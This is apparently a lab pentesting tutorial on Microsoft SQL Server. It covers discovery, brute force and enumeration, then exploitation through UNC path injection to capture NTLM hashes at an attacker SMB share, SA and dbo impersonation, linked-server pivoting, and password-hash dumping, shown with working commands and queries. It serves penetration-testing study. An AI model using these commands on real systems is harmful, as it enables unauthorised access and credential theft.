# Pentesting MSSQL

## Initial Recon / Discovery&#x20;

### Using Nmap

**Confirm MSSQL Server is there**&#x20;

{% code overflow="wrap" %}
```bash
nmap -sS -Pn -n -p 1433 192.168.16.128 --script ms-sql-info,ms-sql-ntlm-info
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Good nmap scripts:**&#x20;

* **`ms-sql-info`**
  * Identify exact SQL Server version&#x20;
  * Tells Service pack level is RTM (Release to Manufacturing) which means it is first official release of the software and no update is applied later.&#x20;
  * Tells whether updates are applied or not after RTM. (`Post-SP patches applied`)
* **`ms-sql-ntlm-info`**
  * Tells that target server is connected to a domain.&#x20;
    * **Domain name:** _backontrack.local_
    * **Target Machine Name:** _DBSRV01_
    * _Using build number too we can fingerprint and identify the type of Operating system in use._&#x20;

### Using Metasploit&#x20;

```shellscript
use auxiliary/scanner/mssql/mssql_version
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

_Microsoft SQL Server version 15.0.2000 corresponds to the initial Release to Manufacturing (RTM) build of **Microsoft SQL Server 2019**, released around November 2019._

## Enumeration&#x20;

### Basic Information&#x20;

#### _ms-sql-empty-password_

* _It test for ‚Äúpassword policy disabled‚Äù because then only password can be empty._&#x20;

<figure><img src="../../../.gitbook/assets/2026-02-08_121947.png" alt=""><figcaption></figcaption></figure>

## Brute Force&#x20;

Note that in MSSQL Server supports two type of authentication.

* Windows Authentication
* SQL Server Authentication

{% hint style="info" %}
_Don't forget to brute force both the type of authentication._
{% endhint %}

**Tools that can bruteforce both type of authentication**&#x20;

* _Metasploit_
* _Netexec / Crackmapexec / nxc_

**Tools that can bruteforce SQL Authentication only**&#x20;

* _Nmap_&#x20;
* _Hydra_

### Using Metasploit

**With Option (`USE_WINDOWS_AUTHENT`) set**

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**With Option (`USE_WINDOWS_AUTHENT`) unset**

<figure><img src="../../../.gitbook/assets/2026-02-08_133117.png" alt=""><figcaption></figcaption></figure>

### Using Netexec / Crackmapexec / nxc

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using Nmap

* _**`ms-sql-brute`**: As the name suggests brute force the database. But we can do these with other tools as well._

<figure><img src="../../../.gitbook/assets/2026-02-08_134258.png" alt=""><figcaption></figcaption></figure>

### Using Hydra&#x20;

<figure><img src="../../../.gitbook/assets/2026-02-08_133344.png" alt=""><figcaption></figcaption></figure>

## Credentialed Enumeration&#x20;

### Manual

#### Gather Basic Server Information&#x20;

```sql
SELECT 
    @@SERVERNAME AS ServerName,
    @@SERVICENAME AS ServiceName,
    @@VERSION AS VersionInfo;
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Enlist all direct sysadmins

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Check Password Policy

```sql
SELECT 
    name,
    is_policy_checked,
    is_expiration_checked,
    create_date
FROM sys.sql_logins;
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Get SQL Server Service Account&#x20;

```sql
SELECT 
    servicename,
    service_account,
    startup_type_desc,
    status_desc
FROM sys.dm_server_services;
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### List Essential Sever Configuration&#x20;

```sql
SELECT name, value_in_use
FROM sys.configurations
WHERE name IN (
    'xp_cmdshell',
    'Ole Automation Procedures',
    'clr enabled',
    'cross db ownership chaining',
    'remote access',
    'show advanced options'
);
-- It has weird output
```

#### Check Agent status&#x20;

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### List Server Logins&#x20;

```sql
SELECT 
    name,
    type_desc,
    is_disabled,
    create_date
FROM sys.server_principals
WHERE type IN ('S','U','G')
ORDER BY type_desc;
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### List Server-Level Privileges for ALL Logins

```sql
SELECT 
    pr.name AS LoginName,
    pr.type_desc,
    pe.permission_name,
    pe.state_desc
FROM sys.server_permissions pe
JOIN sys.server_principals pr
    ON pe.grantee_principal_id = pr.principal_id
ORDER BY pr.name;
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Check if logs are stored

```sql
SELECT value_in_use 
FROM sys.configurations 
WHERE name = 'default trace enabled';
```

### Using PowerUpSQL&#x20;

[using-powerupsql.md](using-powerupsql.md "mention")

### Using SQLRecon

[using-sqlrecon.md](using-sqlrecon.md "mention")

### Using Metasploit

#### Enumerate MSSQL Internals

{% code overflow="wrap" %}
```shellscript
msf6 auxiliary(admin/mssql/mssql_enum) > run
[*] Running MS SQL Server Enumeration...
[*] Using existing session 2
[*] Version:
[*]     Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]             Sep 24 2019 13:48:23 
[*]             Copyright (C) 2019 Microsoft Corporation
[*]             Express Edition (64-bit) on Windows Server 2019 Datacenter Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)
[*] Configuration Parameters:
[*]     C2 Audit Mode is Not Enabled
[*]     xp_cmdshell is Enabled
[*]     remote access is Enabled
[*]     allow updates is Not Enabled
[*]     Database Mail XPs is Not Enabled
[*]     Ole Automation Procedures are Enabled
[*] Databases on the server:
[*]     Database name:master
[*]     Database Files for master:
[*]             C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\master.mdf
[*]             C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
[*]     Database name:tempdb
[*]     Database Files for tempdb:
[*]             C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\tempdb.mdf
[*]             C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\templog.ldf
[*]     Database name:model
[*]     Database Files for model:
[*]     Database name:msdb
[*]     Database Files for msdb:
[*]             C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
[*]             C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
[*]     Database name:sqluserdb
[*]     Database Files for sqluserdb:
[*]     Database name:sqladmindb
[*]     Database Files for sqladmindb:
[*] System Logins on this Server:
[*]     sa
[*]     BUILTIN\Users
[*]     backontrack\sqluser
[*]     backontrack\sqladmin
[*] Disabled Accounts:
[*]     No Disabled Logins Found
[*] No Accounts Policy is set for:
[*]     sa
[*] Password Expiration is not checked for:
[*]     sa
[*] System Admin Logins on this Server:
[*]     sa
[*] Windows Logins on this Server:
[*]     backontrack\sqluser
[*]     backontrack\sqladmin
[*] Windows Groups that can logins on this Server:
[*]     BUILTIN\Users
[*] Accounts with Username and Password being the same:
[*]     No Account with its password being the same as its username was found.
[*] Accounts with empty password:
[*]     No Accounts with empty passwords where found.
[*] Stored Procedures with Public Execute Permission found:
[*]     sp_replsetsyncstatus
[*]     sp_replcounters
[*]     sp_replsendtoqueue
[*]     sp_resyncexecutesql
[*]     sp_prepexecrpc
[*]     sp_repltrans
[*]     sp_xml_preparedocument
[*]     xp_qv
[*]     xp_getnetname
[*]     sp_releaseschemalock
[*]     sp_refreshview
[*]     sp_replcmds
[*]     sp_unprepare
[*]     sp_resyncprepare
[*]     sp_createorphan
[*]     xp_dirtree
[*]     sp_replwritetovarbin
[*]     sp_replsetoriginator
[*]     sp_xml_removedocument
[*]     sp_repldone
[*]     sp_reset_connection
[*]     xp_fileexist
[*]     xp_fixeddrives
[*]     sp_getschemalock
[*]     sp_prepexec
[*]     xp_revokelogin
[*]     sp_execute_external_script
[*]     sp_resyncuniquetable
[*]     sp_replflush
[*]     sp_resyncexecute
[*]     xp_grantlogin
[*]     sp_droporphans
[*]     xp_regread
[*]     sp_getbindtoken
[*]     sp_replincrementlsn
[*] Instances found on this server:
[*] Default Server Instance SQL Server Service is running under the privilege of:
[*]     NT Service\MSSQLSERVER
[*] Auxiliary module execution completed

```
{% endcode %}

## Exploitation&#x20;

{% hint style="info" %}
_Note that there are multiple ways to exploit same vulnerability._&#x20;
{% endhint %}

## Exploiting UNC Path Injection&#x20;

### Manual Way

#### Identification

**Manual**

UNC path injection in MSSQL is possible via `xp_dirtree`, `xp_fileexist`, `xp_subdirs`, `BULK INSERT`, `OPENROWSET`, and `xp_cmdshell`.

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'allow filesystem enumeration';
GO
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Automatic**

1. [Check UNC Path Injection](using-powerupsql.md#check-for-unc-injection)
2. [Perform Vuln Audit ](using-powerupsql.md#perform-vuln-audit-without-exploit)

#### Exploitation&#x20;

1. **Start SMB Server**&#x20;

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

2. **Send request to attacker machine**&#x20;

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **Boom. You got the hash**&#x20;

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using Metasploit

UNC Path injection is exploited if `xp_dirtree`, `xp_filexist` is enabled for public role so that even a normal user can send query to his own machine from sql server and get the hash.&#x20;

#### Start SMB Server&#x20;

<figure><img src="../../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

#### Exploit&#x20;

```
use auxiliary/admin/mssql/mssql_ntlm_stealer
```

<figure><img src="../../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Note the difference between hashdump and mssql\_ntlm\_stealer.&#x20;
{% endhint %}

### Using SQLRecon

#### Start the SMB Server&#x20;

<figure><img src="../../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

#### Enter the Path&#x20;

{% code overflow="wrap" %}
```
SQLRecon.exe /auth:WinToken /h:DBSRV01 /m:smb /unc:\\192.168.16.138\share
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

#### Boom üí£, you got the hash

<figure><img src="../../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

## Exploiting SA Impersonation

### Manual Way&#x20;

#### **Identifcation**

{% code overflow="wrap" %}
```sql
SELECT grantee.name AS Grantee, target.name  AS CanImpersonate FROM sys.server_permissions p JOIN sys.server_principals grantee ON p.grantee_principal_id = grantee.principal_id
JOIN sys.server_principals target ON p.major_id = target.principal_id WHERE p.permission_name = 'IMPERSONATE';
GO
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### **Check if current we're sysadmin**

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### **Exploitation**&#x20;

```
select user_name();

select IS_SRVROLEMEMBER('sysadmin');

EXECUTE AS LOGIN = 'backontrack\sqladmin';
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using PowerUPSQL

#### Identification&#x20;

```powershell
Invoke-SQLAuditPrivImpersonateLogin
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Exploitation&#x20;

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using SQLRecon&#x20;

#### Checking Impersonation &#x20;

```
.\SqlRecon.exe /auth:WinToken /h:DBSRV01 /module:impersonate
```

<figure><img src="../../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

#### Exploitation

{% code overflow="wrap" %}
```
.\SqlRecon.exe /a:WinToken /h:DBSRV01 /i:backontrack\sqladmin /m:query /c:"select suser_sname(),IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

#### Double Chaining

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using Metasploit

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

## Exploit DBO Impersonation&#x20;

### Manual Way&#x20;

#### Identification&#x20;

**Check on which database impersonation things are on**

```sql
SELECT name,SUSER_SNAME(owner_sid) AS owner, is_trustworthy_on FROM sys.databases;
```

{% hint style="info" %}
_DBO Impersonation is possible only if the `is_trustworthy_on option` is enabled. else you'll be promoted to sa but power will limit to database scope only. It is by default on for msdb._&#x20;
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Check which user can impersonate dbo**&#x20;

```sql
USE msdb;
GO

SELECT
    grantee.name AS impersonator,
    target.name  AS impersonation_target,
    perm.permission_name,
    perm.state_desc
FROM sys.database_permissions perm
JOIN sys.database_principals grantee
    ON perm.grantee_principal_id = grantee.principal_id
JOIN sys.database_principals target
    ON perm.major_id = target.principal_id
WHERE perm.permission_name = 'IMPERSONATE'
  AND target.name = 'dbo';
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Exploitation&#x20;

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>Proof that if <code>is_trustworthy_on</code> option is disabled then even after impersonation we are limited to database scope. </summary>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

</details>

## Exploiting Linked Servers&#x20;

### Manual Way

#### Identification&#x20;

```sql
EXEC sp_linkedservers;

select name from sys.servers where is_linked=1;
```

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

#### Exploitation

{% code overflow="wrap" %}
```sql
select * from openquery(DC01,"select @@@servername,SYSTEM_USER,IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin");

EXEC ("SELECT @@servername,suser_sname(),IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin") AT DC01;
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

### Using SQLRecon

#### Identification

```
.\SqlRecon.exe /a:WinToken /h:192.168.16.135 /m:Links
```

<figure><img src="../../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

#### Exploitation

{% code overflow="wrap" %}
```sql
.\SqlRecon.exe /a:WinToken /h:192.168.16.135 /l:DC01 /m:Links /m:query /c:"select suser_sname(),@@servername,IS_SRVROLEMEMBER('sysadmin') as IS_SYSADMIN;"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

## Post-Exploitation&#x20;

## Dump Hashes of SQL Authentication&#x20;

### Using Manual Way&#x20;

```sql
SELECT name, password_hash FROM sys.sql_logins;
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using PowerUpSQL&#x20;

{% hint style="info" %}
_It requires sysadmin permission._&#x20;
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using Metasploit

```shellscript
use auxiliary/scanner/mssql/mssql_hashdump
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

